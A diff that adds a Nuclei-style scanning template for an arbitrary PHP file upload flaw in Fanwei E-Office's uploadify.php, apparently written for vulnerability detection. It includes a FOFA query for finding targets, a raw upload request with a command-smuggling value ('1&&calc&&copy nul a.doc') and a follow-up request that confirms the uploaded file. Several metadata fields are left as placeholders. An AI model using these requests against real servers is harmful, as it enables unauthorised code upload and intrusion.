@@ -1,0 +1,61 @@
+id: FanweiOA_E-Office_uploadify_FileUpload
+
+info:
+  name: 泛微OA_E-Office_uploadify.php_任意文件上传
+  author: candada
+  severity: critical
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="泛微-EOffice"
+  tags: tags
+
+variables:
+  file_name: "Verify.php"
+  file_content: "Verify file upload vulnerability!!!"
+
+http:
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729)
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: close
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: null
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1ZCUAAAXxnYuVIZR
+
+        ------WebKitFormBoundary1ZCUAAAXxnYuVIZR
+        Content-Disposition: form-data; name="name"
+
+        1&&calc&&copy nul a.doc
+        ------WebKitFormBoundary1ZCUAAAXxnYuVIZR
+        Content-Disposition: form-data; name="Filedata"; filename={{file_name}}
+        Content-Type: application/msword
+
+        <?php echo '{{file_content}}';?>
+        ------WebKitFormBoundary1ZCUAAAXxnYuVIZR--
+
+      - |
+        GET /attachment/{{num_path}}/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{file_content}}')"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: num_path
+        internal: true
+        part: body_1
+        regex:
+          - '(\d+)'
